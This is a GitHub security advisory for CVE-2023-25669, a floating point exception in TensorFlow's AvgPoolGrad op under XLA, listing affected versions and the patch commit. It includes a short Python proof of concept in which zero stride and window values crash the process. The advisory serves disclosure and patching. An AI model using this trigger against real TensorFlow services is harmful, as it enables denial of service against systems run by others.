# [H] TensorFlow has Floating Point Exception in AvgPoolGrad with XLA

## Summary
Severity: High
Advisory: GHSA-rcf8-g8jv-vg6p
CVE: CVE-2023-25669
CWE: CWE-697
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-03-24
Source: https://github.com/advisories/GHSA-rcf8-g8jv-vg6p
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.11.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.11.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.11.1

## Details
### Impact
If the stride and window size are not positive for `tf.raw_ops.AvgPoolGrad`, it can give an FPE.

```python
import tensorflow as tf
import numpy as np

@tf.function(jit_compile=True)
def test():
   y = tf.raw_ops.AvgPoolGrad(orig_input_shape=[1,0,0,0], grad=[[[[0.39117979]]]], ksize=[1,0,0,0], strides=[1,0,0,0], padding="SAME", data_format="NCHW")
   return y

print(test())
```

### Patches
We have patched the issue in GitHub commit [1295ae4dbb52fe06b19733b0257e2340d7b63b8d](https://github.com/tensorflow/tensorflow/commit/1295ae4dbb52fe06b19733b0257e2340d7b63b8d).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx of 360 AIVul Team

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rcf8-g8jv-vg6p
- https://nvd.nist.gov/vuln/detail/CVE-2023-25669
- https://github.com/tensorflow/tensorflow/commit/1295ae4dbb52fe06b19733b0257e2340d7b63b8d
- https://github.com/tensorflow/tensorflow
